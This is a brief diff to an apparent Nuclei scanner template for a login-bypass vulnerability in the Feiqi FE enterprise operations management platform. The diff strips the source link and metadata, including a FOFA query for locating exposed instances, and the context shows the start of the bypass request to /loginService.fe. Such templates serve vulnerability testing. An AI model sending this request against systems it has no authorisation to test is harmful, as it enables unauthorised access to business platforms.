@@ -3,12 +3,8 @@ info:
   name: 飞企互联-FE企业运营管理平台登录绕过漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/it2vhae06kl35sa7'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: it2vhae06kl35sa7
-    fofa: app="飞企互联-FE企业运营管理平台"
 http:
 - raw:
   - 'GET /loginService.fe?op=D HTTP/1.1
